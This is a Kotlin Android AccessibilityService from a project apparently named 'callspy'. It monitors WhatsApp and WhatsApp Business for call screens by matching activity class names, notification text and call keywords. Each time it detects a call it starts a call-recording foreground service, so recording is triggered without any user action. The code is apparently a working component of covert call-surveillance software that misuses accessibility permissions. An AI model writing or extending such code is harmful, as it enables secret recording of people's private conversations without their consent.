package com.example.callspy.service

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.content.Intent
import android.os.Build
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo

class CallAccessibilityService : AccessibilityService() {

    companion object {
        private const val TAG = "CallAccessibilityService"
        
        // Common WhatsApp activity class names for call screens (based on research)
        private val WHATSAPP_CALL_CLASS_NAMES = listOf(
            "com.whatsapp.voipcalling.VoipActivityV2",
            "com.whatsapp.voipcalling.VoipActivity",
            "com.whatsapp.calling.CallActivity",
            "CallActivity",
            "VoipActivity",
            "VideoCallActivity"
        )
        
        // WhatsApp package names (regular and business)
        private val WHATSAPP_PACKAGE_NAMES = listOf(
            "com.whatsapp",
            "com.whatsapp.w4b"  // WhatsApp Business
        )
        
        // Keywords that might appear in call screen class names
        private val CALL_KEYWORDS = listOf("call", "voip", "video", "voice", "calling")
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        Log.d(TAG, "Accessibility service connected")

        val info = AccessibilityServiceInfo().apply {
            eventTypes = AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED or
                    AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED or
                    AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED
            
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            notificationTimeout = 100
            
            // Configure for WhatsApp packages
            packageNames = WHATSAPP_PACKAGE_NAMES.toTypedArray()
            
            flags = AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS or
                   AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
                   AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                flags = flags or AccessibilityServiceInfo.FLAG_REQUEST_TOUCH_EXPLORATION_MODE
            }
        }

        serviceInfo = info
        Log.d(TAG, "Accessibility service configured for WhatsApp detection")
        Log.d(TAG, "Monitoring packages: ${WHATSAPP_PACKAGE_NAMES.joinToString()}")
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        when (event.eventType) {
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                val className = event.className?.toString() ?: ""
                val packageName = event.packageName?.toString() ?: ""
                val eventText = event.text?.joinToString() ?: ""
                
                Log.d(TAG, "Window state changed: $packageName/$className")
                Log.d(TAG, "Event text: $eventText")
                
                // Check if it's a WhatsApp call screen
                if (isWhatsAppCallScreen(packageName, className, eventText)) {
                    Log.d(TAG, "WhatsApp call detected! Starting recording")
                    startCallRecording()
                } else if (isWhatsAppPackage(packageName) && containsCallKeywords(className, eventText)) {
                    Log.d(TAG, "Possible WhatsApp call screen detected (keyword match)")
                    startCallRecording()
                }
            }
            
            AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED -> {
                Log.d(TAG, "Notification state changed")
                // Could detect WhatsApp call notifications here
                // WhatsApp call notifications often contain "WhatsApp call" or similar
                val eventText = event.text?.joinToString() ?: ""
                if (eventText.contains("call", ignoreCase = true) && 
                    eventText.contains("whatsapp", ignoreCase = true)) {
                    Log.d(TAG, "WhatsApp call notification detected: $eventText")
                    // We could start recording here too, but window state is more reliable
                }
            }
            
            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
                // Could use this to detect UI changes within call screen
                // For example, if call duration changes or buttons appear
            }
            
            else -> {
                // Other events - log for debugging
                Log.d(TAG, "Other accessibility event: ${event.eventType}")
            }
        }
    }

    override fun onInterrupt() {
        Log.d(TAG, "Accessibility service interrupted")
    }

    private fun isWhatsAppPackage(packageName: String): Boolean {
        return WHATSAPP_PACKAGE_NAMES.any { packageName.contains(it, ignoreCase = true) }
    }
    
    private fun containsCallKeywords(text: String, additionalText: String = ""): Boolean {
        val combinedText = "$text $additionalText".lowercase()
        return CALL_KEYWORDS.any { keyword -> 
            combinedText.contains(keyword, ignoreCase = true) 
        }
    }
    
    private fun isWhatsAppCallScreen(packageName: String, className: String, eventText: String): Boolean {
        // Check if package is WhatsApp
        if (!isWhatsAppPackage(packageName)) {
            return false
        }
        
        // Check if class name matches known WhatsApp call activity names
        if (WHATSAPP_CALL_CLASS_NAMES.any { className.contains(it, ignoreCase = true) }) {
            return true
        }
        
        // Check if class name contains call keywords
        if (containsCallKeywords(className, eventText)) {
            return true
        }
        
        // Additional heuristic: Check event text for call-related terms
        val combinedText = "$className $eventText".lowercase()
        val callIndicators = listOf("call", "voip", "video", "voice", "calling", "duration", "00:00", ":")
        
        return callIndicators.any { indicator -> 
            combinedText.contains(indicator, ignoreCase = true) 
        } && combinedText.contains("whatsapp", ignoreCase = true)
    }

    private fun startCallRecording() {
        try {
            val serviceIntent = Intent(this, CallRecordingService::class.java)
            startForegroundService(serviceIntent)
            Log.d(TAG, "Started CallRecordingService via accessibility service")
        } catch (e: SecurityException) {
            Log.e(TAG, "SecurityException starting recording: ${e.message}")
            Log.e(TAG, "Make sure app has FOREGROUND_SERVICE permission")
        } catch (e: IllegalStateException) {
            Log.e(TAG, "IllegalStateException starting recording: ${e.message}")
        } catch (e: Exception) {
            Log.e(TAG, "Exception starting recording: ${e.message}")
        }
    }
}
